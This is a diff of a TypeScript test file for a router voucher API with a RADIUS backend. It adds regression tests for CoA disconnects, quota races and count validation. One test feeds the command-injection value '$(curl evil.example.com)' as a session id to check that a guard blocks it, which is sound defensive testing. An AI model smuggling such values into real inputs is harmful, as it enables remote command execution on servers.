@@ -1,6 +1,7 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import request from 'supertest';
 import app from '../app';
+import { createVouchersSchema } from '../validators/voucher.validators';
 import {
   TEST_USER,
   authHeader,
@@ -13,6 +14,21 @@ import {
 
 const mockQuery = (globalThis as Record<string, unknown>).__mockPoolQuery as ReturnType<typeof vi.fn>;
 const mockClientQuery = (globalThis as Record<string, unknown>).__mockClientQuery as ReturnType<typeof vi.fn>;
+
+// Mock radclient.service so tests do not spawn real child processes.
+const mockSendDisconnectRequest = vi.fn().mockResolvedValue('ack');
+vi.mock('../services/radclient.service', () => ({
+  sendDisconnectRequest: (...args: unknown[]) => mockSendDisconnectRequest(...args),
+  sendAccessRequest: vi.fn().mockResolvedValue('accept'),
+}));
+
+// Mock encryption so tests do not require a real ENCRYPTION_KEY environment.
+vi.mock('../utils/encryption', () => ({
+  decrypt: vi.fn().mockReturnValue('test-radius-secret'),
+  encrypt: vi.fn().mockReturnValue('encrypted-value'),
+  generateRadiusSecret: vi.fn().mockReturnValue('random-secret'),
+  generateNasIdentifier: vi.fn().mockReturnValue('router-id'),
+}));
 
 const now = new Date();
 
@@ -86,6 +102,8 @@ const BASE_URL = `/api/v1/routers/${TEST_ROUTER_ID}/vouchers`;
 beforeEach(() => {
   mockQuery.mockReset();
   mockClientQuery.mockReset();
+  mockSendDisconnectRequest.mockReset();
+  mockSendDisconnectRequest.mockResolvedValue('ack');
 });
 
 // ─── POST /api/v1/routers/:id/vouchers ───────────────────────────────────────
@@ -148,17 +166,19 @@ describe('POST /api/v1/routers/:id/vouchers', () => {
     // username uniqueness check — not taken
     mockQuery.mockResolvedValueOnce({ rows: [] });
 
-    // Transaction queries: BEGIN + INSERT voucher_meta + 3x radcheck inserts
-    //                      (Cleartext, Simultaneous-Use, Max-All-Session)
-    //                      + UPDATE subscriptions + COMMIT
+    // Transaction (F2 + F3 batched layout):
+    //   BEGIN
+    //   UPDATE subscriptions (guarded quota) → RETURNING vouchers_used
+    //   INSERT voucher_meta  (batch, 1 row)  → RETURNING *
+    //   INSERT radcheck      (batch: Cleartext-Password + Simultaneous-Use + Max-All-Session)
+    //   COMMIT
+    // No radreply row because validBody has no validitySeconds.
     mockClientQuery
-      .mockResolvedValueOnce(undefined) // BEGIN
-      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] }) // INSERT voucher_meta
-      .mockResolvedValueOnce(undefined) // INSERT radcheck Cleartext-Password
-      .mockResolvedValueOnce(undefined) // INSERT radcheck Simultaneous-Use
-      .mockResolvedValueOnce(undefined) // INSERT radcheck limit attribute (time)
-      .mockResolvedValueOnce(undefined) // UPDATE subscriptions vouchers_used
-      .mockResolvedValueOnce(undefined); // COMMIT
+      .mockResolvedValueOnce(undefined)                        // BEGIN
+      .mockResolvedValueOnce({ rows: [{ vouchers_used: 11 }], rowCount: 1 }) // UPDATE subscriptions (guarded)
+      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] })     // INSERT voucher_meta (batch)
+      .mockResolvedValueOnce(undefined)                        // INSERT radcheck (batch)
+      .mockResolvedValueOnce(undefined);                       // COMMIT
 
     // Batch enrichment (3 parallel queries)
     mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);
@@ -174,29 +194,33 @@ describe('POST /api/v1/routers/:id/vouchers', () => {
     expect(res.body.data[0].username).toBe('testuser1');
     expect(res.body.data[0].profileName).toBe('Basic Plan');
 
-    // No validitySeconds in validBody → no Session-Timeout radreply row.
-    const sessionTimeoutCalls = mockClientQuery.mock.calls.filter(
-      (c) => typeof c[0] === 'string' && c[0].includes('radreply') && Array.isArray(c[1]) && c[1][1] === 'Session-Timeout',
+    // No validitySeconds in validBody → no Session-Timeout radreply INSERT.
+    const radreplyInserts = mockClientQuery.mock.calls.filter(
+      (c) => typeof c[0] === 'string' && (c[0] as string).includes('radreply'),
     );
-    expect(sessionTimeoutCalls).toHaveLength(0);
+    expect(radreplyInserts).toHaveLength(0);
   });
 
-  it('inserts Session-Timeout radreply when validitySeconds is set (caps the first session at validity_seconds)', async () => {
+  it('inserts Session-Timeout radreply batch when validitySeconds is set', async () => {
     mockSubscriptionQuery(mockQuery);
     mockCheckQuotaQueries(mockQuery);
     mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] });
     mockQuery.mockResolvedValueOnce({ rows: [] });
 
-    // Transaction now also includes the radreply Session-Timeout INSERT.
+    // Transaction (F3 batched layout with validitySeconds):
+    //   BEGIN
+    //   UPDATE subscriptions (guarded quota) → RETURNING vouchers_used
+    //   INSERT voucher_meta  (batch)          → RETURNING *
+    //   INSERT radcheck      (batch)
+    //   INSERT radreply      (batch: Session-Timeout)
+    //   COMMIT
     mockClientQuery
-      .mockResolvedValueOnce(undefined) // BEGIN
-      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] }) // INSERT voucher_meta
-      .mockResolvedValueOnce(undefined) // radcheck Cleartext-Password
-      .mockResolvedValueOnce(undefined) // radcheck Simultaneous-Use
-      .mockResolvedValueOnce(undefined) // radcheck Max-All-Session
-      .mockResolvedValueOnce(undefined) // radreply Session-Timeout
-      .mockResolvedValueOnce(undefined) // UPDATE subscriptions
-      .mockResolvedValueOnce(undefined); // COMMIT
+      .mockResolvedValueOnce(undefined)                          // BEGIN
+      .mockResolvedValueOnce({ rows: [{ vouchers_used: 11 }], rowCount: 1 }) // UPDATE subscriptions (guarded)
+      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] })       // INSERT voucher_meta (batch)
+      .mockResolvedValueOnce(undefined)                          // INSERT radcheck (batch)
+      .mockResolvedValueOnce(undefined)                          // INSERT radreply Session-Timeout (batch)
+      .mockResolvedValueOnce(undefined);                         // COMMIT
 
     mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);
 
@@ -207,19 +231,15 @@ describe('POST /api/v1/routers/:id/vouchers', () => {
 
     expect(res.status).toBe(201);
 
-    // Exactly one radreply Session-Timeout INSERT, value = '86400', for the
-    // same generated username used in the radcheck Cleartext-Password row.
-    const radcheckPasswordCall = mockClientQuery.mock.calls.find(
-      (c) => typeof c[0] === 'string' && c[0].includes('radcheck') && Array.isArray(c[1]) && c[1][1] === 'Cleartext-Password',
+    // Exactly one batched radreply INSERT that includes 'Session-Timeout'.
+    const radreplyInserts = mockClientQuery.mock.calls.filter(
+      (c) => typeof c[0] === 'string' && (c[0] as string).includes('radreply'),
     );
-    expect(radcheckPasswordCall).toBeDefined();
-    const generatedUsername = radcheckPasswordCall![1][0];
-
-    const sessionTimeoutCalls = mockClientQuery.mock.calls.filter(
-      (c) => typeof c[0] === 'string' && c[0].includes('radreply') && Array.isArray(c[1]) && c[1][1] === 'Session-Timeout',
-    );
-    expect(sessionTimeoutCalls).toHaveLength(1);
-    expect(sessionTimeoutCalls[0][1]).toEqual([generatedUsername, 'Session-Timeout', ':=', '86400']);
+    expect(radreplyInserts).toHaveLength(1);
+    // The VALUES array should contain 'Session-Timeout' and '86400'.
+    const insertArgs = radreplyInserts[0][1] as unknown[];
+    expect(insertArgs).toContain('Session-Timeout');
+    expect(insertArgs).toContain('86400');
   });
 });
 
@@ -392,7 +412,7 @@ describe('DELETE /api/v1/routers/:id/vouchers/:vid', () => {
     expect(res.status).toBe(404);
   });
 
-  it('should delete voucher successfully', async () => {
+  it('should delete voucher successfully (no active CoA session)', async () => {
     // requireSubscription (2 queries)
     mockSubscriptionQuery(mockQuery);
     // verifyRouterOwnership
@@ -409,7 +429,9 @@ describe('DELETE /api/v1/routers/:id/vouchers/:vid', () => {
       .mockResolvedValueOnce(undefined) // DELETE voucher_meta
       .mockResolvedValueOnce(undefined); // COMMIT
 
-    // sendCoaDisconnect → SELECT router (returns empty → skip CoA)
+    // sendCoaDisconnect → SELECT router → returns router (so we reach radacct lookup)
+    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
+    // radacct lookup → no active session
     mockQuery.mockResolvedValueOnce({ rows: [] });
 
     const res = await request(app)
@@ -418,5 +440,186 @@ describe('DELETE /api/v1/routers/:id/vouchers/:vid', () => {
 
     expect(res.status).toBe(200);
     expect(res.body.success).toBe(true);
+    // No active session → sendDisconnectRequest must not have been called
+    expect(mockSendDisconnectRequest).not.toHaveBeenCalled();
+  });
+});
+
+// ─── F1 regression: CoA uses sendDisconnectRequest not exec ──────────────────
+
+describe('DELETE voucher — F1 CoA security regression', () => {
+  it('uses sendDisconnectRequest (not exec) when active radacct session exists', async () => {
+    mockSubscriptionQuery(mockQuery);
+    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] }); // verifyRouterOwnership
+    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });        // SELECT voucher_meta
+
+    mockClientQuery
+      .mockResolvedValueOnce(undefined) // BEGIN
+      .mockResolvedValueOnce(undefined) // DELETE radcheck
+      .mockResolvedValueOnce(undefined) // DELETE radreply
+      .mockResolvedValueOnce(undefined) // DELETE radusergroup
+      .mockResolvedValueOnce(undefined) // DELETE voucher_meta
+      .mockResolvedValueOnce(undefined); // COMMIT
+
+    // sendCoaDisconnect: router lookup
+    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
+    // radacct lookup: one active session with a safe acctsessionid
+    mockQuery.mockResolvedValueOnce({
+      rows: [{ acctsessionid: 'SAFE-SID-001', framedipaddress: '192.168.1.50' }],
+    });
+
+    const res = await request(app)
+      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
+      .set(authHeader());
+
+    expect(res.status).toBe(200);
+
+    // sendDisconnectRequest must have been called with the structured params
+    expect(mockSendDisconnectRequest).toHaveBeenCalledOnce();
+    expect(mockSendDisconnectRequest).toHaveBeenCalledWith(
+      expect.objectContaining({
+        nasIp: '10.10.0.2',
+        username: 'testuser1',
+        acctSessionId: 'SAFE-SID-001',
+      }),
+    );
+  });
+
+  it('skips sendDisconnectRequest when acctsessionid contains shell metacharacters', async () => {
+    mockSubscriptionQuery(mockQuery);
+    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
+    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });
+
+    mockClientQuery
+      .mockResolvedValueOnce(undefined) // BEGIN
+      .mockResolvedValueOnce(undefined) // DELETE radcheck
+      .mockResolvedValueOnce(undefined) // DELETE radreply
+      .mockResolvedValueOnce(undefined) // DELETE radusergroup
+      .mockResolvedValueOnce(undefined) // DELETE voucher_meta
+      .mockResolvedValueOnce(undefined); // COMMIT
+
+    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
+    // acctsessionid with injection payload
+    mockQuery.mockResolvedValueOnce({
+      rows: [{ acctsessionid: '$(curl evil.example.com)', framedipaddress: null }],
+    });
+
+    const res = await request(app)
+      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
+      .set(authHeader());
+
+    expect(res.status).toBe(200);
+    // Guard must block the unsafe id — helper never called
+    expect(mockSendDisconnectRequest).not.toHaveBeenCalled();
+  });
+});
+
+// ─── F2 regression: atomic quota guard ───────────────────────────────────────
+
+describe('POST /api/v1/routers/:id/vouchers — F2 quota race regression', () => {
+  const validBody = { limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 1, price: 5 };
+
+  it('rejects creation and rolls back when guarded UPDATE returns rowCount 0 (quota race)', async () => {
+    mockSubscriptionQuery(mockQuery);  // requireSubscription
+    mockCheckQuotaQueries(mockQuery);  // checkQuota pre-check passes
+    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] }); // verifyRouterOwnership
+    mockQuery.mockResolvedValueOnce({ rows: [] }); // username uniqueness check
+
+    // Transaction: guarded UPDATE returns rowCount 0 (another request beat us)
+    mockClientQuery
+      .mockResolvedValueOnce(undefined)                        // BEGIN
+      .mockResolvedValueOnce({ rows: [], rowCount: 0 })        // UPDATE subscriptions (guarded) — no row updated
+      .mockResolvedValueOnce(undefined);                       // ROLLBACK (triggered by service)
+
+    const res = await request(app)
+      .post(BASE_URL)
+      .set(authHeader())
+      .send(validBody);
+
+    // Must be rejected with 403 (same code as the checkQuota middleware — S1 alignment)
+    expect(res.status).toBe(403);
+    expect(res.body.error.code).toBe('QUOTA_EXCEEDED');
+
+    // No voucher_meta or radcheck inserts must have occurred
+    const insertCalls = mockClientQuery.mock.calls.filter(
+      (c) => typeof c[0] === 'string' && (c[0] as string).toLowerCase().includes('insert'),
+    );
+    expect(insertCalls).toHaveLength(0);
+  });
+});
+
+// ─── F3 regression: count validation ─────────────────────────────────────────
+
+describe('POST /api/v1/routers/:id/vouchers — F3 count cap regression', () => {
+  it('rejects count: 501 with 400 Zod validation error', async () => {
+    mockSubscriptionQuery(mockQuery);
+
+    const res = await request(app)
+      .post(BASE_URL)
+      .set(authHeader())
+      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 501, price: 5 });
+
+    // The validate middleware returns 400 for Zod failures in this codebase.
+    expect(res.status).toBe(400);
+    expect(res.body.error.code).toBe('VALIDATION_ERROR');
+  });
+
+  it('rejects count: 0 with 400 Zod validation error', async () => {
+    mockSubscriptionQuery(mockQuery);
+
+    const res = await request(app)
+      .post(BASE_URL)
+      .set(authHeader())
+      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 0, price: 5 });
+
+    expect(res.status).toBe(400);
+    expect(res.body.error.code).toBe('VALIDATION_ERROR');
+  });
+
+  // S4: Direct Zod schema assertions (replaces the shallow status !== 422 test)
+  it('S4: createVouchersSchema accepts count: 500 (upper boundary)', () => {
+    const validBase = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 500, price: 5 };
+    const result = createVouchersSchema.safeParse(validBase);
+    expect(result.success).toBe(true);
+  });
+
+  it('S4: createVouchersSchema rejects count: 501 (above upper boundary)', () => {
+    const overBoundary = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 501, price: 5 };
+    const result = createVouchersSchema.safeParse(overBoundary);
+    expect(result.success).toBe(false);
+  });
+
+  it('S4: createVouchersSchema rejects count: 0 (below lower boundary)', () => {
+    const underBoundary = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 0, price: 5 };
+    const result = createVouchersSchema.safeParse(underBoundary);
+    expect(result.success).toBe(false);
+  });
+
+  it('accepts count: 500 (boundary — HTTP round-trip also passes)', async () => {
+    mockSubscriptionQuery(mockQuery);
+    mockCheckQuotaQueries(mockQuery);
+    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] });
+    mockQuery.mockResolvedValueOnce({ rows: [] }); // uniqueness check
+
+    // Stub the transaction — guarded quota UPDATE succeeds, then batch inserts
+    mockClientQuery.mockResolvedValue({ rows: [{ vouchers_used: 500 }], rowCount: 1 });
+
+    // The service will try to do batchToVoucherInfo after COMMIT — stub those too
+    // (3 batch pool queries: radcheck, radacct, profiles)
+    mockQuery
+      .mockResolvedValueOnce({ rows: [] }) // radcheck batch
+      .mockResolvedValueOnce({ rows: [] }) // radacct batch
+      .mockResolvedValueOnce({ rows: [] }); // profiles batch
+
+    const res = await request(app)
+      .post(BASE_URL)
+      .set(authHeader())
+      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 500, price: 5 });
+
+    // Zod schema allows 500 — must not be a 400/422 validation error.
+    // (May be 201 on success or a non-validation 5xx if mock data is thin for
+    // 500 rows, but never a schema rejection.)
+    expect(res.status).not.toBe(400);
+    expect(res.status).not.toBe(422);
   });
 });
